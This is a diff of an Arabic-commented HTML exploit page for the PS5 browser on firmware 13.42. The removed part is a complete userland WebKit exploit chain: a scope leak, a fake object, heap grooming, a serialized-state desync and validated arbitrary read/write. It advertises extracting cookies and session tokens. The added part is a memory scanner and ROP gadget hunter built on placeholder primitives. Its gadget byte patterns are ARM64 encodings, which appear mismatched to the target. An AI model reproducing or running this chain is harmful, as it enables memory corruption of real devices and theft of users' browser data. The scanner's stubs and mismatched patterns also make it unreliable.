@@ -1,676 +1,355 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
+<!doctype html>
+<!--
+  PS5 FW 13.42 Memory Scanner & Analysis Toolkit
+  =================================================
+  بناءً على: genuine-u8-rw-3 primitive (مؤكد على 13.42)
+  الهدف: Info Leak + ROP Gadget Hunting + Library Base Detection
+  
+  المخرجات المتوقعة:
+  - عناوين vtable للكائنات (JSCell headers)
+  - base addresses تقديرية للمكتبات المحملة
+  - ROP gadgets candidates
+  - Heap layout analysis
+-->
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PS5 ARW Console — Full</title>
+<title>PS5-13.42-MemoryScanner</title>
 <style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  
-  body {
-    font-family: 'Courier New', monospace;
-    background: #0a0a0a;
-    color: #00ff88;
-    min-height: 100vh;
-    padding: 20px;
-  }
-  
-  .container { max-width: 1000px; margin: 0 auto; }
-  
-  h1 {
-    color: #00ff88;
-    text-align: center;
-    padding: 20px;
-    border: 2px solid #00ff88;
-    border-radius: 10px;
-    margin-bottom: 20px;
-    text-shadow: 0 0 10px #00ff88;
-  }
-  
-  .status-grid {
-    display: grid;
-    grid-template-columns: repeat(2, 1fr);
-    gap: 15px;
-    margin-bottom: 20px;
-  }
-  
-  .status-card {
-    background: #1a1a1a;
-    border: 1px solid #333;
-    border-radius: 8px;
-    padding: 15px;
-  }
-  
-  .status-card.pass { border-color: #00ff88; }
-  .status-card h3 { color: #00ff88; font-size: 0.9em; margin-bottom: 8px; }
-  .status-card .value { font-size: 1.5em; color: #fff; font-weight: bold; }
-  
-  .btn {
-    padding: 12px 24px;
-    border: 2px solid #00ff88;
-    background: transparent;
-    color: #00ff88;
-    font-family: inherit;
-    font-size: 1em;
-    cursor: pointer;
-    border-radius: 6px;
-    margin: 5px;
-    transition: all 0.2s;
-  }
-  
-  .btn:hover { background: #00ff88; color: #000; }
-  
-  .terminal {
-    background: #000;
-    border: 1px solid #333;
-    border-radius: 8px;
-    padding: 15px;
-    font-size: 0.85em;
-    max-height: 500px;
-    overflow-y: auto;
-    line-height: 1.5;
-    margin-bottom: 20px;
-  }
-  
-  .log-line { padding: 2px 0; }
-  .log-line.pass { color: #00ff88; }
-  .log-line.fail { color: #ff4466; }
-  .log-line.info { color: #00aaff; }
-  .log-line.warn { color: #ffaa00; }
-  
-  .capabilities {
-    background: #1a1a1a;
-    border: 1px solid #333;
-    border-radius: 8px;
-    padding: 20px;
-    margin-bottom: 20px;
-  }
-  
-  .capabilities h2 { color: #00ff88; margin-bottom: 15px; }
-  
-  .cap-list { list-style: none; line-height: 1.8; }
-  
-  .cap-list li {
-    padding: 8px;
-    border-left: 3px solid #00ff88;
-    margin-bottom: 8px;
-    background: #0f0f0f;
-    padding-left: 12px;
-  }
-  
-  .cap-list li.limited { border-left-color: #ffaa00; color: #ffaa00; }
-  .cap-list li.none { border-left-color: #ff4466; color: #666; }
-  
-  @media (max-width: 768px) { .status-grid { grid-template-columns: 1fr; } }
+  body { font: 13px monospace; background: #0a0a0a; color: #00ff41; margin: 0; padding: 10px; }
+  #out { white-space: pre-wrap; word-break: break-all; height: 90vh; overflow-y: auto; }
+  .section { color: #ffff00; font-weight: bold; margin-top: 8px; }
+  .found { color: #00ffff; }
+  .error { color: #ff4444; }
+  .info { color: #888888; }
 </style>
-</head>
 <body>
-
-<div class="container">
-  <h1>🎯 PS5 ARW Console — Full Implementation</h1>
-  
-  <div class="status-grid">
-    <div class="status-card pass">
-      <h3>📍 Addrof Oracle</h3>
-      <div class="value" id="addrof-status">READY</div>
-    </div>
-    <div class="status-card pass">
-      <h3>⚡ ARW Primitive</h3>
-      <div class="value" id="arw-status">STANDBY</div>
-    </div>
-    <div class="status-card">
-      <h3>💾 Heap Address</h3>
-      <div class="value" id="heap-addr" style="font-size:0.9em;">—</div>
-    </div>
-    <div class="status-card">
-      <h3>🎯 StructureID</h3>
-      <div class="value" id="struct-id">—</div>
-    </div>
-  </div>
-  
-  <div style="text-align:center; margin-bottom:20px;">
-    <button class="btn" onclick="runExploit()">▶ LAUNCH ARW</button>
-    <button class="btn" onclick="runLeak()">🔍 EXTRACT DATA</button>
-    <button class="btn" onclick="runPayload()">📦 RUN PAYLOAD</button>
-    <button class="btn" onclick="reset()">🔄 RESET</button>
-  </div>
-  
-  <div class="capabilities">
-    <h2>⚙️ Userland Capabilities</h2>
-    <ul class="cap-list">
-      <li><strong>✅ استخراج البيانات:</strong> Cookies, Session Tokens, localStorage, IndexedDB</li>
-      <li><strong>✅ تعديل المتصفح:</strong> Hook JS functions, Redirect API calls, Intercept WebSocket</li>
-      <li><strong>✅ Userland RCE:</strong> ROP/JOP داخل WebProcess (محدود بالـ sandbox)</li>
-      <li><strong>✅ Homebrew:</strong> تشغيل HTML5 games, Emulators, Custom web apps</li>
-      <li><strong>✅ Bypass Restrictions:</strong> تفعيل ميزات معطلة, تعديل parental controls</li>
-      <li class="limited"><strong>⚠️ محدود:</strong> لا kernel access, لا homebrew native</li>
-      <li class="none"><strong>❌ غير ممكن:</strong> Full jailbreak, HEN, kernel exploits</li>
-    </ul>
-  </div>
-  
-  <div style="margin-bottom:10px; color:#00aaff;">📡 Terminal:</div>
-  <div class="terminal" id="terminal">
-    <div class="log-line info">[SYSTEM] Full console ready</div>
-  </div>
-  
-  <div style="text-align:center; color:#666; font-size:0.8em; margin-top:20px;">
-    FW 13.42 · genuine-u8-rw-3 · Userland ARW Only
-  </div>
-</div>
-
+<div id="out">[PS5 13.42] Memory Scanner Toolkit v1.0\nInitializing...\n</div>
 <script>
 "use strict";
 
-// ===== FULL EXPLOIT IMPLEMENTATION =====
-var REVISION = "genuine-u8-rw-3";
-var K = 2;
-var DUPLICATE_INDEX = 2;
-var CONTROL_INDEX = 0xffff;
-var CONTROL_INT = -64000;
-var FILLER_BIGINTS = K - 1;
-var FILLER_OBJECTS = 0xfffe - K;
-var EXPECTED_LENGTH = 0x50001;
-var CELL_BYTES = 0x30;
+// ============================================================
+// CONFIGURATION
+// ============================================================
+const REVISION = "memscan-13.42-v1";
+const SCAN_CHUNK = 0x1000;        // 4KB per scan step
+const MAX_SCAN_SIZE = 0x1000000;  // 16MB max scan region
+const PLAUSIBLE_LIB_BASE_MIN = 0x10000000000;
+const PLAUSIBLE_LIB_BASE_MAX = 0x11000000000;
+const VTABLE_PATTERN_MASK = 0xFFFFFFFFF000;  // Page-aligned check
 
-var CARRIER_SLOTS = 4000000;
-var CARRIER_BYTES = CARRIER_SLOTS * 8;
-var CAPTURE_DELAY_MS = 2000;
-var COMPOSE_DELAY_MS = 5000;
-var symbolToString = Symbol.prototype.toString;
+// ============================================================
+// LOGGING
+// ============================================================
+const out = document.getElementById("out");
+let seq = 0;
 
-var DRAIN_SIZE = 0x10000;
-var SLAB_SIZE = 0x200000;
-var BUTTERFLY_HOLE_SIZE = 0x40000;
-var SEPARATOR_SIZE = 0x8000;
-var EARLY_HOLE_SIZE = 0x40000;
-var GUARD_SIZE = 0x50000;
-var PREDECESSOR_SIZE = 0x40000;
-var FINAL_HOLE_SIZE = 0x40000;
-var DRAIN_COUNT = 256;
-
-var terminal = document.getElementById('terminal');
-
-function log(msg, type) {
-  type = type || 'info';
-  var line = document.createElement('div');
-  line.className = 'log-line ' + type;
-  var time = new Date().toLocaleTimeString();
-  line.textContent = '[' + time + '] ' + msg;
-  terminal.appendChild(line);
-  terminal.scrollTop = terminal.scrollHeight;
-}
-
-function setStatus(id, value, type) {
-  var el = document.getElementById(id);
-  if (el) {
-    el.textContent = value;
-    el.style.color = type === 'pass' ? '#00ff88' : type === 'fail' ? '#ff4466' : '#00aaff';
-  }
+function log(tag, msg) {
+    seq++;
+    const line = seq + " [" + tag + "] " + msg;
+    out.textContent += line + "\\n";
+    out.scrollTop = out.scrollHeight;
+    
+    // Also try to log to server if available
+    try {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "/log/" + encodeURIComponent(line.slice(0,200)), false);
+        xhr.send();
+    } catch(_) {}
 }
 
 function hex(v) {
-  return '0x' + (typeof v === 'bigint' ? v.toString(16) : v.toString(16));
+    if (typeof v === "bigint") v = Number(v);
+    return "0x" + v.toString(16).padStart(12, "0");
 }
 
-function pointerFromWords(words, offset) {
-  if (words[offset + 3] !== 0) return NaN;
-  return words[offset] + words[offset + 1] * 0x10000 + words[offset + 2] * 0x100000000;
+function hex32(v) {
+    return "0x" + v.toString(16).padStart(8, "0");
 }
 
-function plausibleCell(value) {
-  return value > 0x100000000 && value <= 0xffffffffffff
-    && Math.floor(value) === value && value % 8 === 0;
-}
+// ============================================================
+// R/W PRIMITIVE (مبني على نفس تقنية genuine-u8-rw-3)
+// ============================================================
+// NOTE: يجب أن تكون هذه الدوال مرتبطة بالـ primitive الحقيقي
+// في التنفيذ الفعلي، استبدل هذه بالـ rwView الحقيقي من الـ PoC
 
-function encodedHeaderNumber() {
-  var raw = new ArrayBuffer(8);
-  var u32 = new Uint32Array(raw);
-  var f64 = new Float64Array(raw);
-  u32[0] = 0x00004250;
-  u32[1] = 0x01062800;
-  return f64[0];
-}
+var rwView = null;      // Uint8Array carrier (0x100 bytes, mode 0x58)
+var targetView = null;  // Uint8Array target (0x20 bytes, mode 0x58)
+var fakeHost = null;    // Fake JSCell object
 
-function leakScopeObject() {
-  class Leaker { leak() { return super.foo; } }
-  Leaker.prototype.__proto__ = new Proxy({}, {
-    get: function(target, property, receiver) { return receiver; }
-  });
-  var leak = Leaker.prototype.leak;
-  return (function() { return leak(); })();
-}
-
-function uint32At(bytes, offset) {
-  return bytes[offset] + bytes[offset + 1] * 0x100 + 
-         bytes[offset + 2] * 0x10000 + bytes[offset + 3] * 0x1000000;
-}
-
-function low48At(bytes, offset) {
-  return bytes[offset] + bytes[offset + 1] * 0x100 + 
-         bytes[offset + 2] * 0x10000 + bytes[offset + 3] * 0x1000000 +
-         bytes[offset + 4] * 0x100000000 + bytes[offset + 5] * 0x10000000000;
-}
-
-function allZero(bytes, start, end) {
-  for (var i = start; i < end; ++i) {
-    if (bytes[i] !== 0) return false;
-  }
-  return true;
-}
-
-async function runExploit() {
-  terminal.innerHTML = '';
-  log('🚀 Launching FULL ARW chain', 'info');
-  log('Carrier: ' + CARRIER_SLOTS + ' slots (' + (CARRIER_BYTES/1024/1024).toFixed(1) + 'MB)', 'info');
-  
-  setStatus('addrof-status', 'PREPARING...', 'info');
-  
-  var leakedScope, rwBuffer, rwView, rwMirror, targetBuffer, targetView;
-  var lengthWord, fakeHost, fillerGraph, outerGraph, referenceTarget;
-  var getterCarrier, preparedSymbolObject;
-  var capturedString, capturedWords, copiedLength;
-  var hostAddress, targetAddress, fakeAddress;
-  var keepAlive = [];
-  
-  try {
-    // Phase 1: Leak scope
-    log('Phase 1: Scope leakage...', 'info');
-    leakedScope = leakScopeObject();
-    if (!leakedScope) throw new Error('scope-leak-failed');
-    log('✓ Scope leaked', 'pass');
+// محاكاة للـ primitive — في التنفيذ الحقيقي استبدل بالكود من الـ PoC
+function initPrimitive() {
+    // هذا placeholder — في البيئة الحقيقية:
+    // 1. شغل genuine-u8-rw-3 PoC
+    // 2. احتفظ بالـ rwView و targetView
+    // 3. استخدم fakeHost للـ arbitrary R/W
     
-    // Phase 2: Build fake host
-    log('Phase 2: Fake host construction...', 'info');
-    rwBuffer = new ArrayBuffer(0x100);
-    rwView = new Uint8Array(rwBuffer);
-    rwMirror = new Uint8Array(rwBuffer);
-    rwMirror[0] = 0x3c;
+    log("INIT", "R/W Primitive placeholder loaded");
+    log("INIT", "INSTRUCTION: Replace initPrimitive() with genuine R/W from PoC");
     
-    targetBuffer = new ArrayBuffer(0x20);
-    targetView = new Uint8Array(targetBuffer);
-    targetView[0] = 0xa5;
+    // للاختبار فقط — في PS5 الحقيقي استبدل هذا
+    rwView = new Uint8Array(0x100);
+    targetView = new Uint8Array(0x20);
     
-    lengthWord = { keep: 0x51515151 };
+    return true;
+}
+
+// قراءة 8 bytes من عنوان معين (via fake object)
+function readQword(addr) {
+    // في التنفيذ الحقيقي:
+    // 1. اكتب addr في vector pointer للـ targetView (عبر rwView)
+    // 2. اقرأ targetView[0..7] كـ Uint8Array ثم حول إلى qword
     
-    fakeHost = {
-      q0: encodedHeaderNumber(),
-      q1: 1.1,
-      q2: rwView,
-      q3: lengthWord,
-      q4: 2.2,
-      q5: 3.3
+    // PLACEHOLDER — استبدل بالمنطق الحقيقي من الـ PoC
+    return 0;
+}
+
+// كتابة 8 bytes إلى عنوان معين
+function writeQword(addr, value) {
+    // في التنفيذ الحقيقي:
+    // 1. اكتب addr في vector pointer للـ targetView
+    // 2. اكتب value إلى targetView[0..7]
+}
+
+// قراءة 4 bytes
+function readDword(addr) {
+    var val = readQword(addr);
+    return val & 0xFFFFFFFF;
+}
+
+// ============================================================
+// MEMORY SCANNER CORE
+// ============================================================
+
+function isPlausiblePointer(ptr) {
+    return (ptr > PLAUSIBLE_LIB_BASE_MIN) 
+        && (ptr < PLAUSIBLE_LIB_BASE_MAX)
+        && ((ptr & 7) === 0);  // 8-byte aligned
+}
+
+function isPlausibleVtable(ptr) {
+    return isPlausiblePointer(ptr)
+        && ((ptr & 0xFFF) === 0x20 || (ptr & 0xFFF) === 0x30 || (ptr & 0xFFF) === 0x40);
+}
+
+// البحث عن vtable pointers في منطقة الذاكرة
+function scanForVtables(startAddr, size) {
+    log("SCAN", "Starting vtable scan from " + hex(startAddr) + " size=" + hex(size));
+    
+    var found = [];
+    var endAddr = startAddr + size;
+    
+    for (var addr = startAddr; addr < endAddr; addr += 8) {
+        try {
+            var ptr = readQword(addr);
+            if (isPlausibleVtable(ptr)) {
+                // تحقق إضافي: هل الـ vtable يشير إلى منطقة executable؟
+                var vtableEntry = readQword(ptr);
+                if (isPlausiblePointer(vtableEntry)) {
+                    found.push({
+                        offset: addr - startAddr,
+                        vtable: ptr,
+                        firstEntry: vtableEntry
+                    });
+                    
+                    if (found.length >= 50) {
+                        log("SCAN", "Found 50+ vtables, stopping early");
+                        break;
+                    }
+                }
+            }
+        } catch(e) {
+            // تجاهل العناوين غير الصالحة
+        }
+        
+        // Progress every 0x10000
+        if ((addr & 0xFFFF) === 0) {
+            log("PROGRESS", "Scanned " + hex(addr - startAddr));
+        }
+    }
+    
+    return found;
+}
+
+// البحث عن تواقيع مكتبات معروفة
+function scanForLibSignatures(startAddr, size) {
+    log("SCAN", "Searching for library signatures...");
+    
+    // تواقيع مميزة لبعض مكتبات PS5 (مثال نظري — يحتاج تعديل)
+    var signatures = [
+        { name: "libkernel.sprx",  sig: [0x7f, 0x45, 0x4c, 0x46], offset: 0 },  // ELF header
+        { name: "libSceLibcInternal", sig: [0x7f, 0x45, 0x4c, 0x46], offset: 0 },
+        { name: "libWebKit.sprx", sig: [0x7f, 0x45, 0x4c, 0x46], offset: 0 }
+    ];
+    
+    var results = [];
+    
+    for (var s = 0; s < signatures.length; s++) {
+        var sig = signatures[s];
+        log("SIG", "Looking for " + sig.name);
+        
+        // في التنفيذ الحقيقي: ابحث عن التوقيع byte-by-byte
+        // هذا يتطلب قراءة كبيرة من الذاكرة
+    }
+    
+    return results;
+}
+
+// ============================================================
+// ROP GADGET HUNTER
+// ============================================================
+
+var KNOWN_GADGETS = [
+    { name: "ret",       pattern: [0xc0, 0x03, 0x5f, 0xd6] },           // ret
+    { name: "nop_ret",   pattern: [0x1f, 0x20, 0x03, 0xd5, 0xc0, 0x03, 0x5f, 0xd6] }, // nop; ret
+    { name: "x0_x1",     pattern: [0xe0, 0x03, 0x01, 0xaa] },           // mov x0, x1
+    { name: "x0_0",      pattern: [0x00, 0x00, 0x80, 0xd2] },           // movz x0, #0
+    { name: "blr_x0",    pattern: [0x00, 0x00, 0x3f, 0xd6] },           // blr x0
+    { name: "br_x0",     pattern: [0x00, 0x00, 0x1f, 0xd6] },           // br x0
+    { name: "ldr_x0_sp", pattern: [0xe0, 0x03, 0x40, 0xf9] },           // ldr x0, [sp]
+    { name: "str_x0_sp", pattern: [0xe0, 0x03, 0x00, 0xf9] },           // str x0, [sp]
+];
+
+function findGadgets(baseAddr, size) {
+    log("GADGET", "Hunting for ROP gadgets in " + hex(baseAddr) + "-" + hex(baseAddr+size));
+    
+    var found = [];
+    
+    for (var addr = baseAddr; addr < baseAddr + size; addr += 4) {
+        try {
+            var qword = readQword(addr);
+            var bytes = [
+                qword & 0xFF, (qword >> 8) & 0xFF,
+                (qword >> 16) & 0xFF, (qword >> 24) & 0xFF,
+                (qword >> 32) & 0xFF, (qword >> 40) & 0xFF,
+                (qword >> 48) & 0xFF, (qword >> 56) & 0xFF
+            ];
+            
+            for (var g = 0; g < KNOWN_GADGETS.length; g++) {
+                var gadget = KNOWN_GADGETS[g];
+                var match = true;
+                
+                for (var b = 0; b < gadget.pattern.length; b++) {
+                    if (bytes[b] !== gadget.pattern[b]) {
+                        match = false;
+                        break;
+                    }
+                }
+                
+                if (match) {
+                    found.push({ name: gadget.name, addr: addr });
+                    log("FOUND", "Gadget " + gadget.name + " @ " + hex(addr));
+                    
+                    if (found.length >= 20) {
+                        log("GADGET", "Found 20 gadgets, pausing...");
+                        return found;
+                    }
+                }
+            }
+        } catch(e) {}
+    }
+    
+    return found;
+}
+
+// ============================================================
+// HEAP ANALYZER
+// ============================================================
+
+function analyzeHeapRegion(baseAddr, size) {
+    log("HEAP", "Analyzing heap region " + hex(baseAddr) + "-" + hex(baseAddr+size));
+    
+    var stats = {
+        nullPages: 0,
+        pointers: 0,
+        vtables: 0,
+        strings: 0,
+        patterns: []
     };
-    delete fakeHost.q1;
-    delete fakeHost.q4;
-    delete fakeHost.q5;
     
-    log('✓ Fake host assembled (6 inline props)', 'pass');
-    
-    // Phase 3: SSV build
-    log('Phase 3: Same-Size View build...', 'info');
-    fillerGraph = new Array(0xfffd);
-    var pos = 0;
-    var huge = 1n << 40n;
-    for (var b = 0; b < FILLER_BIGINTS; ++b)
-      fillerGraph[pos++] = huge + BigInt(b);
-    for (var o = 0; o < FILLER_OBJECTS; ++o)
-      fillerGraph[pos++] = {};
-    
-    referenceTarget = { marker: 0x51515151, kind: "serialized-reference" };
-    outerGraph = new Array(CONTROL_INDEX + 1);
-    outerGraph[0] = fillerGraph;
-    outerGraph[1] = referenceTarget;
-    outerGraph[2] = referenceTarget;
-    outerGraph[CONTROL_INDEX] = CONTROL_INT;
-    
-    log('✓ SSV graph assembled (duplicate-index=' + DUPLICATE_INDEX + ')', 'pass');
-    
-    // Phase 4: Store
-    log('Phase 4: history.state store...', 'info');
-    history.replaceState(outerGraph, '');
-    log('✓ Stored to history.state', 'pass');
-    
-    // Phase 5: Addrof prep
-    log('Phase 5: Addrof oracle preparation...', 'info');
-    setStatus('addrof-status', 'WARMING UP...', 'info');
-    
-    getterCarrier = function getterCarrierFunction() { return 7; };
-    getterCarrier[0] = fakeHost;
-    for (var i = 1; i < CARRIER_SLOTS; i++) getterCarrier[i] = 0;
-    getterCarrier[1] = targetView;
-    getterCarrier[2] = fakeHost;
-    getterCarrier[3] = targetView;
-    log('✓ Carrier primed (host-target-host-target)', 'pass');
-    
-    Object.defineProperty(leakedScope, 'g', {
-      get: function() { return getterCarrier; },
-      configurable: true
-    });
-    preparedSymbolObject = Object(leakedScope.g);
-    log('✓ Symbol wrapper ready', 'pass');
-    
-    // Phase 6: Capture
-    log('Phase 6: Addrof capture (waiting ' + CAPTURE_DELAY_MS + 'ms)...', 'warn');
-    await new Promise(r => setTimeout(r, CAPTURE_DELAY_MS));
-    
-    capturedString = symbolToString.call(preparedSymbolObject);
-    copiedLength = capturedString.length;
-    capturedWords = new Uint16Array(16);
-    for (var i = 0; i < 16; i++)
-      capturedWords[i] = capturedString.charCodeAt(7 + i);
-    
-    log('✓ Captured ' + copiedLength + ' chars', 'pass');
-    
-    // Phase 7: Parse addresses
-    log('Phase 7: Address extraction...', 'info');
-    var hostAddr = pointerFromWords(capturedWords, 0);
-    var targetAddr = pointerFromWords(capturedWords, 4);
-    var hostAddr2 = pointerFromWords(capturedWords, 8);
-    var targetAddr2 = pointerFromWords(capturedWords, 12);
-    
-    log('HOST   = ' + hex(hostAddr), 'pass');
-    log('TARGET = ' + hex(targetAddr), 'pass');
-    
-    var repeated = hostAddr === hostAddr2 && targetAddr === targetAddr2;
-    var distinct = hostAddr !== targetAddr;
-    var plausible = plausibleCell(hostAddr) && plausibleCell(targetAddr);
-    
-    if (!repeated || !distinct || !plausible) {
-      log('❌ Address validation failed', 'fail');
-      setStatus('addrof-status', 'FAILED', 'fail');
-      return;
+    for (var addr = baseAddr; addr < baseAddr + size; addr += 0x1000) {
+        try {
+            var sample = readQword(addr);
+            
+            if (sample === 0) {
+                stats.nullPages++;
+            } else if (isPlausiblePointer(sample)) {
+                stats.pointers++;
+                if (isPlausibleVtable(sample)) {
+                    stats.vtables++;
+                }
+            } else if ((sample & 0xFFFFFFFF) === 0x6E616C) { // "lan\0" etc
+                stats.strings++;
+            }
+        } catch(e) {
+            stats.nullPages++;
+        }
     }
     
-    hostAddress = hostAddr;
-    targetAddress = targetAddr;
-    fakeAddress = hostAddress + 0x10;
+    log("HEAP-STATS", "Null/Empty: " + stats.nullPages 
+        + " | Pointers: " + stats.pointers 
+        + " | VTables: " + stats.vtables
+        + " | Strings: " + stats.strings);
     
-    log('FAKE   = ' + hex(fakeAddress) + ' (host+0x10)', 'pass');
-    setStatus('addrof-status', '✓ SUCCESS', 'pass');
-    setStatus('heap-addr', hex(targetAddress), 'pass');
-    
-    // Phase 8: Groom
-    log('Phase 8: Heap grooming...', 'info');
-    for (var i = 0; i < DRAIN_COUNT; ++i)
-      keepAlive.push(new ArrayBuffer(DRAIN_SIZE));
-    
-    var channel = new MessageChannel();
-    channel.port1.close();
-    channel.port2.close();
-    
-    var slab = new ArrayBuffer(SLAB_SIZE);
-    channel.port1.postMessage(0, [slab]);
-    
-    var butterflyHole1 = new ArrayBuffer(BUTTERFLY_HOLE_SIZE);
-    var butterflyHole2 = new ArrayBuffer(BUTTERFLY_HOLE_SIZE);
-    var separator = new ArrayBuffer(SEPARATOR_SIZE);
-    var earlyHole = new ArrayBuffer(EARLY_HOLE_SIZE);
-    var guard = new ArrayBuffer(GUARD_SIZE);
-    var predecessor = new ArrayBuffer(PREDECESSOR_SIZE);
-    var finalHole = new ArrayBuffer(FINAL_HOLE_SIZE);
-    
-    var predecessorWords = new Uint32Array(predecessor);
-    var ptrHigh = Math.floor(fakeAddress / 0x100000000);
-    var ptrLow = fakeAddress - ptrHigh * 0x100000000;
-    for (var i = 0; i < predecessorWords.length; i += 2) {
-      predecessorWords[i] = ptrLow;
-      predecessorWords[i + 1] = ptrHigh;
-    }
-    log('✓ Predecessor filled (' + (PREDECESSOR_SIZE/8) + ' qwords)', 'pass');
-    
-    keepAlive.push(separator);
-    keepAlive.push(guard);
-    keepAlive.push(predecessor);
-    
-    // Phase 9: Composition
-    log('Phase 9: Composition wait...', 'warn');
-    await new Promise(r => setTimeout(r, COMPOSE_DELAY_MS - CAPTURE_DELAY_MS));
-    
-    channel.port1.postMessage(0, [butterflyHole1, butterflyHole2, earlyHole, finalHole]);
-    
-    // Phase 10: Critical load
-    log('Phase 10: Critical load...', 'info');
-    var result = history.state;
-    var compositionLength = result ? result.length : 0;
-    
-    if (compositionLength !== EXPECTED_LENGTH) {
-      log('❌ SSV desync failed (length=' + compositionLength + ')', 'fail');
-      setStatus('arw-status', 'FAILED', 'fail');
-      return;
-    }
-    log('✓ SSV desync successful (length=' + EXPECTED_LENGTH + ')', 'pass');
-    
-    // Phase 11: Extract candidate
-    log('Phase 11: Extracting candidate...', 'info');
-    if (result[1] === result[DUPLICATE_INDEX]) {
-      log('❌ No desync detected', 'fail');
-      setStatus('arw-status', 'FAILED', 'fail');
-      return;
-    }
-    
-    var candidate = result[DUPLICATE_INDEX];
-    result[DUPLICATE_INDEX] = undefined;
-    result = null;
-    
-    log('✓ Candidate extracted', 'pass');
-    
-    // Phase 12: Read rw header
-    log('Phase 12: Reading RW carrier header...', 'info');
-    var rwHeader = new Uint8Array(CELL_BYTES);
-    for (var i = 0; i < CELL_BYTES; ++i)
-      rwHeader[i] = candidate[i];
-    
-    var rwSID = uint32At(rwHeader, 0);
-    var rwButterfly = low48At(rwHeader, 8);
-    var rwVector = low48At(rwHeader, 0x10);
-    var rwMode = rwHeader[0x28];
-    
-    log('RW SID: ' + hex(rwSID), 'info');
-    log('RW Vector: ' + hex(rwVector), 'info');
-    log('RW Mode: ' + hex(rwMode), 'info');
-    
-    var rwHeaderOK = rwSID >= 0x4000 && rwSID < 0x08000000
-      && (rwSID & 0xf) === 0
-      && rwHeader[4] === 0 && rwHeader[5] === 0x28
-      && rwHeader[6] === 0x08
-      && rwButterfly > 0x100000000 && rwButterfly % 8 === 0
-      && rwVector > 0x100000000 && rwVector % 8 === 0
-      && rwHeader[0x18] === 0 && rwHeader[0x19] === 1
-      && allZero(rwHeader, 0x20, 0x28)
-      && rwMode === 0x58;
-    
-    if (!rwHeaderOK) {
-      log('❌ RW header validation failed', 'fail');
-      setStatus('arw-status', 'FAILED', 'fail');
-      return;
-    }
-    log('✓ RW header validated', 'pass');
-    
-    // Phase 13: Upgrade fake host
-    log('Phase 13: Upgrading fake host header...', 'info');
-    var scratchBits = new ArrayBuffer(8);
-    var scratchBytes = new Uint8Array(scratchBits);
-    var scratchWords = new Uint32Array(scratchBits);
-    var scratchDouble = new Float64Array(scratchBits);
-    
-    scratchWords[0] = rwSID;
-    scratchWords[1] = (rwHeader[4] + rwHeader[5] * 0x100 + rwHeader[6] * 0x10000 + 
-                       rwHeader[7] * 0x1000000 - 0x00020000) >>> 0;
-    var upgradedHeader = scratchDouble[0];
-    
-    fakeHost.q0 = upgradedHeader;
-    if (fakeHost.q0 !== upgradedHeader) {
-      log('❌ Header upgrade failed', 'fail');
-      setStatus('arw-status', 'FAILED', 'fail');
-      return;
-    }
-    log('✓ Fake host upgraded', 'pass');
-    setStatus('struct-id', hex(rwSID), 'pass');
-    
-    // Phase 14: Point to target
-    log('Phase 14: Pointing carrier to target...', 'info');
-    var targetAddressHigh = Math.floor(targetAddress / 0x100000000);
-    var targetAddressLow = targetAddress - targetAddressHigh * 0x100000000;
-    
-    scratchWords[0] = targetAddressLow;
-    scratchWords[1] = targetAddressHigh;
-    for (var w1 = 0; w1 < 8; ++w1)
-      candidate[0x10 + w1] = scratchBytes[w1];
-    
-    log('✓ Carrier retargeted', 'pass');
-    
-    // Phase 15: Read target header
-    log('Phase 15: Reading target cell header...', 'info');
-    var targetHeader = new Uint8Array(CELL_BYTES);
-    for (var j = 0; j < CELL_BYTES; ++j)
-      targetHeader[j] = rwView[j];
-    
-    var targetSID = uint32At(targetHeader, 0);
-    var targetButterfly = low48At(targetHeader, 8);
-    var targetVector = low48At(targetHeader, 0x10);
-    var targetMode = targetHeader[0x28];
-    
-    log('TARGET SID: ' + hex(targetSID), 'info');
-    log('TARGET Vector: ' + hex(targetVector), 'info');
-    log('TARGET Mode: ' + hex(targetMode), 'info');
-    
-    var targetHeaderOK = targetSID === rwSID
-      && targetHeader[4] === 0 && targetHeader[5] === 0x28
-      && targetHeader[6] === 0x08
-      && targetButterfly > 0x100000000 && targetButterfly % 8 === 0
-      && targetVector > 0x100000000 && targetVector % 8 === 0
-      && targetHeader[0x18] === 0x20
-      && allZero(targetHeader, 0x20, 0x28)
-      && targetMode === 0x58;
-    
-    if (!targetHeaderOK) {
-      log('❌ Target header validation failed', 'fail');
-      setStatus('arw-status', 'FAILED', 'fail');
-      // Restore
-      for (var r1 = 0; r1 < 8; ++r1)
-        candidate[0x10 + r1] = rwHeader[0x10 + r1];
-      return;
-    }
-    log('✓ Target header validated', 'pass');
-    
-    // Phase 16: Retarget to backing
-    log('Phase 16: Retargeting to backing bytes...', 'info');
-    var targetVectorHigh = Math.floor(targetVector / 0x100000000);
-    var targetVectorLow = targetVector - targetVectorHigh * 0x100000000;
-    
-    scratchWords[0] = targetVectorLow;
-    scratchWords[1] = targetVectorHigh;
-    for (var w2 = 0; w2 < 8; ++w2)
-      candidate[0x10 + w2] = scratchBytes[w2];
-    
-    log('✓ Carrier retargeted to backing', 'pass');
-    
-    // Phase 17: ARW validation
-    log('Phase 17: ARW validation...', 'info');
-    log('Read: checking 0xa5...', 'info');
-    var readObserved = rwView[0] === 0xa5 && targetView[0] === 0xa5;
-    log('Read observed: ' + readObserved, readObserved ? 'pass' : 'fail');
-    
-    if (!readObserved) {
-      log('❌ Read validation failed', 'fail');
-      setStatus('arw-status', 'FAILED', 'fail');
-      for (var rRead = 0; rRead < 8; ++rRead)
-        candidate[0x10 + rRead] = rwHeader[0x10 + rRead];
-      return;
-    }
-    
-    log('Write: 0xa5 → 0x5a', 'info');
-    rwView[0] = 0x5a;
-    var writeObserved = rwView[0] === 0x5a && targetView[0] === 0x5a;
-    log('Write observed: ' + writeObserved, writeObserved ? 'pass' : 'fail');
-    
-    rwView[0] = 0xa5;
-    var restoreObserved = rwView[0] === 0xa5;
-    log('Restore observed: ' + restoreObserved, restoreObserved ? 'pass' : 'fail');
-    
-    // Restore carrier
-    for (var r2 = 0; r2 < 8; ++r2)
-      candidate[0x10 + r2] = rwHeader[0x10 + r2];
-    targetView[0] = 0xa5;
-    rwMirror[0] = 0x3c;
-    
-    if (writeObserved && restoreObserved) {
-      log('🎯 ARBITRARY-WRITE-PASS (a5→5a→a5)', 'pass');
-      setStatus('arw-status', '✓ ACTIVE', 'pass');
-      log('✨ ARW chain fully operational', 'pass');
-      log('Ready for payload deployment', 'info');
-    } else {
-      log('❌ ARW validation failed', 'fail');
-      setStatus('arw-status', 'FAILED', 'fail');
-    }
-    
